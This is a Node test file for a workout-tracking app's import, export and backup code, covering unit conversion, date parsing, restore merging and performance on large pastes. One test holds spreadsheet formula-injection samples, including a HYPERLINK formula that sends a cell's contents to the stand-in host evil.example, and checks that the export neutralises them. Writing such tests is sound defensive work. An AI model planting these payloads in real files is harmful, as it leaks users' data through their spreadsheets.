// Run: node --test tests/import-qa.test.mjs
// Findings from QA agent 2 (import, export and backup), one test per finding. Every log line here is made up.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

// state.js and db.js run in Node on db.js's localStorage fallback.
const store = new Map();
globalThis.localStorage = { getItem: k => (store.has(k) ? store.get(k) : null), setItem: (k, v) => store.set(k, String(v)), removeItem: k => store.delete(k), clear: () => store.clear() };
globalThis.location ??= { search: '' };
const io = await import('../js/io.js');
const state = await import('../js/state.js');
const { parseSplitText } = await import('../js/split.js');
const { EXERCISES } = await import('../js/seed.js');
const { S } = state;

const exById = Object.fromEntries(EXERCISES.map(e => [e.id, e]));
const pick = u => EXERCISES.find(e => e.unit === u);
const kgEx = pick('kg'), dbEx = pick('kg/DB'), lEx = pick('L'), bwEx = pick('bw');
const loads = sessions => sessions[0].entries.map(e => e.sets.map(s => s.w));
const csv1 = (weight, extra = '') => `Date,Exercise,Weight,Reps${extra ? ',' + extra.split('|')[0] : ''}\n2026-09-21,Squat,${weight},8${extra ? ',' + extra.split('|')[1] : ''}\n`;
const w1 = (weight, opts) => io.sessionsFromCSV(csv1(weight), opts)[0]?.entries[0].sets[0].w;
const ms = fn => { const t = performance.now(); fn(); return performance.now() - t; };

// ---- 1. a pounds user re-importing their own CSV ----------------------------------------------------
test('1: our own CSV reads back with the same loads for a pounds user (dumbbell, level and added load too)', () => {
  const sessions = [{ id: 's1', date: '2026-09-21', name: 'Push', entries: [
    { exId: kgEx.id, sets: [{ w: 60.5, r: 8, done: true }] },
    { exId: dbEx.id, sets: [{ w: 22.5, r: 10, done: true }] },
    { exId: lEx.id, sets: [{ w: 9, r: 12, done: true }] },
    { exId: bwEx.id, sets: [{ w: 0, r: 12, done: true }, { w: 10, r: 6, done: true }] },
  ] }];
  const csv = io.toCSV(sessions, exById);
  const want = [[60.5], [22.5], [9], [0, 10]];
  assert.deepEqual(loads(io.sessionsFromCSV(csv, { lb: false })), want);
  assert.deepEqual(loads(io.sessionsFromCSV(csv, { lb: true })), want);
});

test('1: cable levels are never converted from pounds', () => {
  const s = io.sessionsFromCSV('Date,Exercise,Unit,Weight,Reps\n2026-09-21,Cable fly,L,9,12\n', { lb: true });
  assert.equal(s[0].entries[0].sets[0].w, 9);
});

// ---- 2 and 13. restoring a backup: merge keeps, replace swaps ---------------------------------------
test('2: a merge restore adds measurements and daily logs but keeps what is on this phone', async () => {
  store.clear();
  await state.load();
  await state.saveMeasure({ id: 'm-A', date: '2026-09-20', waist: 80 });
  await state.saveDaily('2026-09-20', { protein: 150, water: 2.5 });
  const file = JSON.parse(JSON.stringify(await state.exportAll()));
  file.measures = [{ id: 'm-B', date: '2026-09-26', waist: 78 }, { id: 'm-C', date: '2026-09-20', waist: 99 }, { id: 'm-A', date: '2026-09-20', waist: 70 }];
  file.daily = { '2026-09-20': { steps: 9000, protein: 1 }, '2026-09-21': { water: 3 } };
  await state.importAll(file, { merge: true });
  assert.deepEqual(S.measures.map(m => [m.id, m.waist]), [['m-A', 80], ['m-B', 78]]);
  assert.deepEqual(S.daily['2026-09-20'], { protein: 150, water: 2.5, steps: 9000 });
  assert.deepEqual(S.daily['2026-09-21'], { water: 3 });
});

test('13: a replace restore (and Undo, which is one) clears daily logs and measurements not in the file', async () => {
  store.clear();
  await state.load();
  const file = JSON.parse(JSON.stringify(await state.exportAll()));
  delete file.measures; file.daily = { '2026-09-02': { protein: 5 } };
  await state.saveMeasure({ id: 'm-old', date: '2026-09-01', waist: 90 });
  await state.saveDaily('2026-09-01', { protein: 99 });
  await state.importAll(structuredClone(file));
  assert.deepEqual(S.measures, []);
  assert.deepEqual(S.daily, { '2026-09-02': { protein: 5 } });
});

// ---- 12. settings.gyms from a backup -----------------------------------------------------------------
test('12: gyms that are null, a string or junk become a valid list, and gymId points at a gym in it', async () => {
  for (const [gyms, gymId] of [['x', 'g1'], [null, 'g1'], [[null, 5, 'a'], { x: 1 }], [[], 'g9'], [[{ id: 'g2', name: 'Home' }], 'g9']]) {
    store.clear();
    await state.load();
    const file = JSON.parse(JSON.stringify(await state.exportAll()));
    file.settings.gyms = gyms; file.settings.gymId = gymId;
    file.sessions = [{ id: 'a', date: '2026-09-20', name: 'x', gymId: 'g1', entries: [{ exId: 'bench', sets: [{ w: 20, r: 5, done: true }] }] }];
    await state.importAll(file);
    assert.ok(Array.isArray(S.settings.gyms) && S.settings.gyms.length, JSON.stringify(gyms));
    assert.ok(S.settings.gyms.every(g => typeof g.id === 'string' && g.id && typeof g.name === 'string'));
    assert.ok(S.settings.gyms.some(g => g.id === S.settings.gymId), JSON.stringify([gyms, gymId, S.settings]));
    assert.doesNotThrow(() => io.toCSV(S.sessions, S.exById, S.settings.gyms));
  }
  const clean = state.sanitizeBackup({ app: 'setlist', sessions: [], settings: { deletedExercises: 'bench', units: 'stone' } }).settings;
  assert.deepEqual(clean.deletedExercises, []);
  assert.equal('units' in clean, false);
});

// ---- 3. HTML and XML stripping in linear time ---------------------------------------------------------
test('3: crafted HTML/XML (unclosed sms, style, CDATA) is processed quickly', () => {
  for (const s of ['<sms body="'.repeat(5000), '<style '.repeat(40000), '<![CDATA['.repeat(40000), '<script>'.repeat(30000), '<sms '.repeat(11000)]) {
    const t = ms(() => io.htmlToText(s));
    assert.ok(t < 200, `${s.slice(0, 12)}… took ${t.toFixed(0)} ms`);
  }
  // Still does its job.
  assert.equal(io.htmlToText('<sms address="1" body="Bench 60kg x8&#10;Row 50kg x8" date="1" />').trim(), 'Bench 60kg x8\nRow 50kg x8');
  assert.equal(io.htmlToText('<head><title>x</title></head><p>a<![CDATA[b]]></p><STYLE>p{}</STYLE><script>1</script>c').trim(), 'ab\nc');
});

// ---- 11. malformed entities ---------------------------------------------------------------------------
test('11: invalid HTML entities do not throw, and entity names are not looked up on the prototype', () => {
  assert.doesNotThrow(() => io.htmlToText('&#1114112; &#xD800; &#99999999;'));
  assert.doesNotMatch(io.htmlToText('&#1114112;x&#xD800;'), /[\ud800-\udfff]/);
  assert.equal(io.htmlToText('a &constructor; b').trim(), 'a &constructor; b');
  assert.equal(io.importFile('log.html', new TextEncoder().encode('<p>28/9/2026</p><p>Bench press 60kg x 8 &#1114112;</p>'), EXERCISES).sessions.length, 1);
  assert.ok(io.matchExercise('Constructor bench press', EXERCISES));
});

// ---- 5. big pastes -----------------------------------------------------------------------------------
test('5: a 5 MB chat export and 1 MB of blank lines parse quickly', () => {
  const chat = Array.from({ length: 100000 }, (_, i) => `[21/09/2026, 18:0${i % 10}:11] Ali: ok see you at the gym lol`).join('\n');
  const t1 = ms(() => io.parseLogText(chat, EXERCISES, { year: 2026 }));
  assert.ok(t1 < 3000, `chat took ${t1.toFixed(0)} ms`);
  const t2 = ms(() => io.parseLogText('\n'.repeat(1e6), EXERCISES, { year: 2026 }));
  assert.ok(t2 < 500, `blank lines took ${t2.toFixed(0)} ms`);
  const t3 = ms(() => io.parseLogText('21/9/2026 Push\n' + Array.from({ length: 20000 }, (_, i) => `note ${i} about stuff`).join('\n'), EXERCISES, { year: 2026 }));
  assert.ok(t3 < 1500, `lowercase notes took ${t3.toFixed(0)} ms`);
  // Blank lines still separate blocks.
  const s = io.parseLogText('21/9/2026 Push\n\n\n\n\nBench press\n60kg x 8\n\n\n\nRow\n50kg x 8', EXERCISES, { year: 2026 }).sessions;
  assert.deepEqual(s[0].entries.map(e => e.exName), ['Bench press', 'Row']);
});

// ---- 4. the Import CSV button decodes like Import logs ------------------------------------------------
test('4: the Import CSV button decodes the file bytes (Shift-JIS, GBK, UTF-16) with decodeBytes', () => {
  const src = readFileSync(new URL('../js/views/more.js', import.meta.url), 'utf8');
  const h = src.slice(src.indexOf("async 'csv-in'"), src.indexOf("'rm-seed'"));
  assert.match(h, /decodeBytes\(/);
  assert.doesNotMatch(h, /readFile\(/);
  assert.match(h, /try\s*\{/);
});

// ---- 6. Malay months and weekdays ---------------------------------------------------------------------
test('6: Malay month and weekday names are read', () => {
  const cases = { '28 Ogos 2026': '2026-08-28', '28 Ogo 2026': '2026-08-28', '28 Mei 2026': '2026-05-28', '1 Januari 2026': '2026-01-01', '12 Julai 2026': '2026-07-12',
    '5 Mac 2026': '2026-03-05', '28 Okt 2026': '2026-10-28', '28 Oktober 2026': '2026-10-28', '28 Disember 2026': '2026-12-28', '3 Dis 2026': '2026-12-03', '9 Februari 2026': '2026-02-09',
    '9 Sept 2026': '2026-09-09', 'Selasa, 1 September 2026': '2026-09-01' };
  for (const [d, want] of Object.entries(cases)) assert.equal(io.findDate(d, 2026), want, d);
  for (const w of ['Isnin', 'Selasa', 'Rabu', 'Khamis', 'Jumaat', 'Sabtu', 'Ahad']) {
    const s = io.parseLogText(`${w} 28/9\nBench press 60kg x 8`, EXERCISES, { year: 2026 }).sessions;
    assert.equal(s[0]?.date, '2026-09-28', w);
  }
  assert.equal(io.sessionsFromCSV('Tarikh,Senaman,Berat,Ulangan\n5 Mac 2026,Squat,60,8\n')[0]?.date, '2026-03-05');
  // Ordinary words are still not dates.
  assert.equal(io.findDate('Mac and cheese 3 reps', 2026), null);
});

// ---- 7. pounds written in the weight cell -------------------------------------------------------------
test('7: a weight cell in pounds is converted; one in kg is not', () => {
  assert.equal(w1('135lbs'), io.lbToKg(135));
  assert.equal(w1('"135 lb"'), io.lbToKg(135));
  assert.equal(w1('135 pounds'), io.lbToKg(135));
  assert.equal(w1('60kg'), 60);
  assert.equal(w1('60 kg', { lb: true }), 60);
});

// ---- 8. thousands separators --------------------------------------------------------------------------
test('8: thousands separators and decimal commas', () => {
  assert.equal(w1('"1,000"'), 1000);
  assert.equal(w1('1.000 kg'), 1000);
  assert.equal(w1('"60,5"'), 60.5);
  assert.equal(w1('"1,234.5"'), 1234.5);
  assert.equal(w1('"1.000,5"'), 1000.5);
  assert.equal(w1('22.5'), 22.5);
  assert.equal(w1('2.000'), 2);
  assert.equal(w1('0x10'), null);
  const s = io.parseLogText('28/9/2026\nLeg press 1.000 kg x 8', EXERCISES, { year: 2026 }).sessions;
  assert.equal(s[0].entries[0].sets[0].w, 1000);
});

// ---- 9. formula injection through semicolons ----------------------------------------------------------
test('9: formula text after a semicolon or leading spaces is neutralised, and such fields are quoted', () => {
  const csv = io.toCSV([{ date: '2026-09-21', name: '  =1+1', entries: [{ exId: 'a', sets: [{ w: 1, r: 1, done: true }], note: 'good set;=HYPERLINK("http://evil.example/?"&A1,"click")' }] }],
    { a: { name: 'Bench;@SUM(1+1)*cmd|calc', unit: 'kg' } });
  const row = csv.split('\n')[1];
  // Split the way a semicolon-locale Excel would: no piece may start with a formula character.
  for (const cell of row.split(/[;,]/)) assert.doesNotMatch(cell.replace(/^"/, '').trimStart(), /^[=+\-@]/, cell);
  assert.match(row, /"Bench;'@SUM/);
  const [s] = io.sessionsFromCSV(csv);
  assert.equal(s.entries[0].exName, 'Bench;@SUM(1+1)*cmd|calc');
  assert.equal(s.entries[0].note, 'good set;=HYPERLINK("http://evil.example/?"&A1,"click")');
  assert.equal(s.name, '=1+1');
});

// ---- 10. date order ----------------------------------------------------------------------------------
test('10: a couple of Chinese lift names do not flip a day-first sheet to month first', () => {
  const s = io.sessionsFromCSV('Date,Exercise,Weight,Reps\n5/9/2026,深蹲,60,8\n6/9/2026,Squat,60,8\n7/9/2026,Bench,60,8\n');
  assert.deepEqual(s.map(x => x.date), ['2026-09-05', '2026-09-06', '2026-09-07']);
  // A Chinese sheet, or a Chinese or Japanese app language, still reads month first.
  assert.equal(io.sessionsFromCSV('日期,动作,重量,次数\n5/9/2026,深蹲,60,8\n')[0].date, '2026-05-09');
  assert.equal(io.sessionsFromCSV('Date,Exercise,Weight,Reps\n5/9/2026,Squat,60,8\n', { lang: 'ja' })[0].date, '2026-05-09');
  // The dates themselves decide when they can.
  assert.equal(io.sessionsFromCSV('日期,动作,重量,次数\n5/9/2026,深蹲,60,8\n25/9/2026,深蹲,60,8\n')[0].date, '2026-09-05');
});

// ---- 14. CSV round trip --------------------------------------------------------------------------------
test('14: the CSV round trip keeps returns, apostrophe-guarded text, emoji and session details', () => {
  const ex = { a: { name: '🏋️‍♀️ Hip thrust', unit: 'kg' } };
  const csv = io.toCSV([{ date: '2026-09-21', name: 'Legs', gymId: 'g2', hr: 142, note: 'slept badly\r\nstill ok', entries: [{ exId: 'a', sets: [{ w: 50, r: 5, done: true }], note: 'line1\rline2 -2 reps' }, { exId: 'a2', sets: [{ w: 5, r: 5, done: true }], note: '-2 reps on last' }] }],
    ex, [{ id: 'g2', name: 'Home gym' }]);
  const [s] = io.sessionsFromCSV(csv);
  assert.equal(s.entries[0].exName, '🏋️‍♀️ Hip thrust');
  assert.equal(s.entries[0].note, 'line1\rline2 -2 reps');
  assert.equal(s.entries[1].note, '-2 reps on last');
  assert.equal(s.hr, 142);
  assert.equal(s.gym, 'Home gym');
  assert.deepEqual(s.notes, ['slept badly\r\nstill ok']);
  // An apostrophe someone typed themselves stays.
  assert.equal(io.sessionsFromCSV("Date,Exercise,Weight,Reps,Note\n2026-09-21,Squat,60,8,'=not ours\n")[0].entries[0].note, "'=not ours");
});

// ---- 15. smaller edge cases ---------------------------------------------------------------------------
test('15: CSV rows dated after tomorrow are left out and counted', () => {
  const s = io.sessionsFromCSV('Date,Exercise,Weight,Reps\n2099-01-01,Squat,60,8\n2026-09-20,Squat,60,8\n', { today: '2026-09-28' });
  assert.deepEqual(s.map(x => x.date), ['2026-09-20']);
  assert.equal(s.future, 1);
  assert.equal(io.sessionsFromCSV('Date,Exercise,Weight,Reps\n2026-09-29,Squat,60,8\n', { today: '2026-09-28' }).length, 1);
});

test('15: "-20kg" is assistance only on an assisted lift', () => {
  const p = t => io.parseLogText('28/9/2026\n' + t, EXERCISES, { year: 2026 }).sessions[0].entries[0].sets[0].w;
  assert.equal(p('Assisted pull up -20kg x 8'), -20);
  assert.equal(p('Bench press -20kg x 8'), 20);
  const c = (n, w) => io.sessionsFromCSV(`Date,Exercise,Weight,Reps\n2026-09-20,${n},${w},8\n`)[0].entries[0].sets[0].w;
  assert.equal(c('Assisted dip', -20), -20);
  assert.equal(c('Squat', -20), 20);
});

// ---- extra: the foreign-name dictionaries load only when an import needs them --------------------------
test('the Chinese, Japanese and Malay name dictionaries are not loaded with io.js, only when asked for', async () => {
  const { spawnSync } = await import('node:child_process');
  const ioUrl = new URL('../js/io.js', import.meta.url).href;
  const code = `import { registerHooks } from 'node:module';
    const seen = []; registerHooks({ load(url, ctx, next) { seen.push(url); return next(url, ctx); } });
    const n = () => seen.filter(u => /\\/i18n\\//.test(u)).length;
    const io = await import(${JSON.stringify(ioUrl)}); const before = n();
    await io.foreignNamesReady; const after = n();
    const s = io.parseLogText('2026-09-21\\n杠铃卧推 60kg x 8', (await import(${JSON.stringify(new URL('../js/seed.js', import.meta.url).href)})).EXERCISES, { year: 2026 }).sessions;
    console.log(JSON.stringify({ before, after, match: s[0].entries[0].match }));`;
  const r = spawnSync(process.execPath, ['--input-type=module', '-e', code], { encoding: 'utf8' });
  const out = JSON.parse(r.stdout.trim().split('\n').pop());
  assert.equal(out.before, 0, r.stderr);
  assert.ok(out.after >= 3);
  assert.ok(out.match, 'the Chinese name matched after loading');
});

test('pasted split names are capped (exercise 80, day 40 characters)', () => {
  const r = parseSplitText(`Monday - ${'P'.repeat(300)}\n${'Bench press '.repeat(30)}3 x 8`);
  assert.ok(r.days[0].name.length <= 40);
  assert.ok(r.days[0].items[0].name.length <= 80);
});

test('15: the split parser survives a 5 MB percentage line and reads CR-only line breaks', () => {
  assert.doesNotThrow(() => parseSplitText('Monday\nSquat ' + '65% x5, '.repeat(5e5)));
  const r = parseSplitText('Monday - Push\rBench press 4 x 6-8\rIncline DB 3x10\r');
  assert.equal(r.days[0].items.length, 2);
});
